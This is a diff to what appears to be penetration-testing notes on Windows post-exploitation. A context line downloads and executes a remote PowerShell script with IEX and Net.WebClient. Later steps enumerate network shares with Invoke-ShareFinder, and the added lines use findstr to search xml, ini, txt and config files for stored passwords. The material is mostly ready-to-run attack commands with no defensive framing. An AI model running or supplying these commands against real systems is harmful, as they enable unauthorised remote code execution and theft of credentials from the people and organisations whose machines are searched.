@@ -10,10 +10,14 @@ IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 4. Run Sharefinder
 Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
 
-5. Search for keyword
+5. Search for keyword (all not tested yet)
 This one is slow
 dir -Recurse | Select-String -pattern [SEARCH_PATTERN]
 
 Get-ChildItem -Recurse *.* | Select-String -Pattern "foobar" | Select-Object -Unique Path
 
 dir -recurse *.* | sls -pattern "foobar" | select -unique path
+
+cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
+findstr /si password *.xml *.ini *.txt *.config
+findstr /spin "password" *.*
